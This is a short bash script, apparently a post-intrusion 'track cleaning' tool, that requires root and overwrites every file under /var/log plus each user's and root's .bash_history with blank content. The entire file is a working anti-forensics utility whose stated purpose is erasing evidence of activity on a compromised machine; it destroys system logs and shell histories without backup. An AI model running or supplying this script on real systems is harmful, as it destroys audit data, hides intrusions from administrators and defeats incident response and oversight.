#!/bin/bash
printf "====================================================================\r\n"
printf "=              SoftSteps - Cleaning Your Tracks...                 =\r\n"
printf "=            Author Trickster0 aka Thanasis Tserpelis              =\r\n"
printf "= This Script Needs Root Privileges To Completely Wipe Your Tracks =\r\n"
printf "====================================================================\r\n\r\n"

printf "[+] Cleaning Logs...\r\n"
mapfile -t logfiles < <(find /var/log -type f)
numlogfiles=${#logfiles[@]}
for ((b=0; b<${numlogfiles};b++));
do
	echo "" > ${logfiles[$b]}
done

printf "[+] Cleaning Bash Histories...\r\n"
mapfile -t users < <(ls /home)
numusers=${#users[@]}
for ((i=0; i<${numusers};i++));
do
	echo "" > /home/${users[$i]}/.bash_history
done

echo "" > /root/.bash_history

printf "[+] All Your Tracks Have Been Cleaned If You Ran This As Root!\r\n"
